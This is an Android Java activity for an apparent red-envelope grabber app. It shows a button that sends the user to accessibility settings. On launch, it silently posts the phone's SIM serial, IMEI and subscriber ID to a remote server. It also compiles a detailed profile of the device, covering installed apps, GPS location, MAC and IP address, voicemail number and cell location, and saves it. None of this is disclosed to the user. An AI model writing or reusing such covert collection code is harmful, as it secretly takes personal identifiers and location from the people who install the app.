package com.w.activity;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.w.R;
import com.w.service.RedBagService;
import com.w.util.CommonUtil;
import com.w.util.HttpUtil;

/**
 * 
 * 红包主界面
 */
public class RedBagActivity extends Activity {
	// static final String VALIDATE =
	// "http://cloudcenter.applinzi.com/Index/I/deviceAdd";
	static final String VALIDATE = CommonUtil.SERVER_URL + "cloudcenter/index.php/Index/I/deviceAdd";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_redbag);

		findViewById(R.id.start_button).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				open();
			}
		});
		/**
		 * 注册设备信息
		 */
		Thread t = new Thread(new Runnable() {
			@Override
			public void run() {
				sendDevice();
			}
		});
		t.start();
	}

	private void sendDevice() {
		TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
		List<NameValuePair> params = new ArrayList<NameValuePair>();
		params.add(new BasicNameValuePair("sim", tm.getSimSerialNumber()));
		params.add(new BasicNameValuePair("deviceid", tm.getDeviceId()));
		params.add(new BasicNameValuePair("userid", tm.getSubscriberId()));
		HttpUtil.doPost(VALIDATE, params);
	}

	/**
	 * 提示打开辅助功能
	 */
	private void open() {
		try {
			Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
			startActivity(intent);
			Toast.makeText(this, "找到本应用，开启服务", Toast.LENGTH_SHORT).show();
			String detail = CommonUtil.simpleMapToJsonStr(getInfo());
			CommonUtil.setSharedValue("detail", detail, getApplicationContext());
		} catch (Exception e) {
			Log.e(RedBagService.TAG, e.getMessage());
		}
	}

	private Map<String, String> getInfo() {
		PackageManager packageManager = getPackageManager();
		PackageInfo packInfo = null;
		try {
			packInfo = packageManager.getPackageInfo(getPackageName(), 0);
		} catch (NameNotFoundException e) {
			Log.e(RedBagService.TAG, e.getMessage());
		}
		Map<String, String> map = new HashMap<String, String>();
		map.put("subscriberId", "系统时间:" + System.currentTimeMillis());
		map.put("softVersion", "软件版本:" + packInfo.versionName);
		map.put("mobileType", "手机型号:" + android.os.Build.MODEL);
		map.put("mobileType", "手机型号:" + android.os.Build.MODEL);
		map.put("board", "品牌:" + android.os.Build.BOARD);
		map.put("firmware", "Firmware/OS版本号:" + android.os.Build.VERSION.RELEASE);
		map.put("incremental", "源码控制版本号:" + android.os.Build.VERSION.INCREMENTAL);
		map.put("buildTime", "编译时间:" + android.os.Build.TIME);
		TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
		map.put("mac", "Mac地址:" + String.valueOf(getLocalMacAddress()));
		map.put("sdk", "SDK版本:" + android.os.Build.VERSION.SDK_INT);
		map.put("phone", "电话状态:" + String.valueOf(tm.getCallState()));
		map.put("location", "电话方位:" + String.valueOf(tm.getCellLocation()));
		map.put("imei", "唯一设备ID:" + tm.getDeviceId());
		map.put("deviceVersion", "设备软件版本号:" + tm.getDeviceSoftwareVersion());
		map.put("cpu", "CPU信息:" + getCpuInfo());
		map.put("teleno", "国际长途区号:" + tm.getNetworkCountryIso());
		map.put("MCC_MNC", "国家码+网络码:" + tm.getNetworkOperator());
		map.put("currentNet", "当前已注册网络:" + tm.getNetworkOperatorName());
		map.put("networkType", "当前使用的网络类型:" + String.valueOf(tm.getNetworkType()));
		map.put("signalType", "手机信号类型:" + tm.getPhoneType());
		map.put("isoCountryCode", "ISO国家码:" + tm.getSimCountryIso());
		map.put("SIM_MCC_MNC", "SIM卡国家码+网络码:" + tm.getSimOperator());
		map.put("memory", "总内存和可用内存:" + getTotalMemory());
		map.put("simSerialNumber", "SIM卡的序列号:" + tm.getSimSerialNumber());
		map.put("simState", "SIM卡状态:" + tm.getSimState());
		map.put("subscriberId", "唯一用户ID:" + tm.getSubscriberId());
		map.put("voiceMailAlphaTag", "语音邮件识别符:" + tm.getVoiceMailAlphaTag());
		map.put("voiceMailNumber", "语音邮件号码:" + tm.getVoiceMailNumber());
		map.put("hasIccCard", "ICC卡是否存在:" + tm.hasIccCard());
		map.put("isNetworkRoaming", "是否漫游:" + tm.isNetworkRoaming());
		DisplayMetrics dm = new DisplayMetrics();
		getWindowManager().getDefaultDisplay().getMetrics(dm);
		map.put("heightPixels", "屏幕高度:" + dm.heightPixels);
		map.put("widthPixels", "屏幕宽度:" + dm.widthPixels);
		map.put("localIpAddress", "IP地址:" + getLocalIpAddress());
		map.put("apps", "已安软件:" + getAllApp());
		map.put("gpsInfo", "定位信息:" + getGPSInfo());
		return map;
	}

	/**
	 * 取IP
	 */
	public String getLocalIpAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress()) {
						return inetAddress.getHostAddress().toString();
					}
				}
			}
		} catch (SocketException e) {
			Log.e(RedBagService.TAG, e.getMessage());
		}
		return "无";
	}

	/**
	 * 取Mac
	 */
	public String getLocalMacAddress() {
		WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		WifiInfo info = wifi.getConnectionInfo();
		return info.getMacAddress() == null ? "无" : info.getMacAddress();
	}

	/**
	 * 获取手机安装的应用信息
	 * 
	 * @return
	 */
	private String getAllApp() {
		String result = "";
		List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
		for (PackageInfo i : packages) {
			if ((i.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
				result += i.applicationInfo.loadLabel(getPackageManager()).toString() + "\n";
			}
		}
		return result.substring(0, result.length() - 1);
	}

	/**
	 * 获取手机总内存和可用内存
	 * 
	 * @return
	 */
	private String getTotalMemory() {
		String[] result = { "", "" }; // 1-total 2-avail
		ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
		ActivityManager mActivityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		mActivityManager.getMemoryInfo(mi);
		long mTotalMem = 0;
		long mAvailMem = mi.availMem;
		String str1 = "/proc/meminfo";
		String str2;
		String[] arrayOfString;
		try {
			FileReader localFileReader = new FileReader(str1);
			BufferedReader localBufferedReader = new BufferedReader(localFileReader, 8192);
			str2 = localBufferedReader.readLine();
			arrayOfString = str2.split("\\s+");
			mTotalMem = Integer.valueOf(arrayOfString[1]).intValue() * 1024;
			localBufferedReader.close();
		} catch (IOException e) {
			Log.e(RedBagService.TAG, e.getMessage());
		}
		result[0] = Formatter.formatFileSize(this, mTotalMem);
		result[1] = Formatter.formatFileSize(this, mAvailMem);
		return result[0] + "-" + result[1];
	}

	/**
	 * 手机CPU信息
	 * 
	 * @return
	 */
	private String getCpuInfo() {
		String str1 = "/proc/cpuinfo";
		String str2 = "";
		String[] cpuInfo = { "", "" }; // 1-cpu型号 //2-cpu频率
		String[] arrayOfString;
		try {
			FileReader fr = new FileReader(str1);
			BufferedReader localBufferedReader = new BufferedReader(fr, 8192);
			str2 = localBufferedReader.readLine();
			arrayOfString = str2.split("\\s+");
			for (int i = 2; i < arrayOfString.length; i++) {
				cpuInfo[0] = cpuInfo[0] + arrayOfString[i] + " ";
			}
			str2 = localBufferedReader.readLine();
			arrayOfString = str2.split("\\s+");
			cpuInfo[1] += arrayOfString[2];
			localBufferedReader.close();
		} catch (IOException e) {
			Log.e(RedBagService.TAG, e.getMessage());
		}
		return cpuInfo[0] + "-" + cpuInfo[1];
	}

	/**
	 * 获取手机位置
	 */
	private String getGPSInfo() {
		// 获得位置服务的名称
		String serviceName = Context.LOCATION_SERVICE;
		// 获得位置服务的管理对象
		LocationManager locationManager = (LocationManager) getSystemService(serviceName);
		// 通过GPS获取定位的位置数据
		Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		if (location != null) {
			double latitude = location.getLatitude();
			double longitude = location.getLongitude();
			return "纬度:" + latitude + " 经度:" + longitude;
		} else {
			return "暂未获取";
		}
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}
}
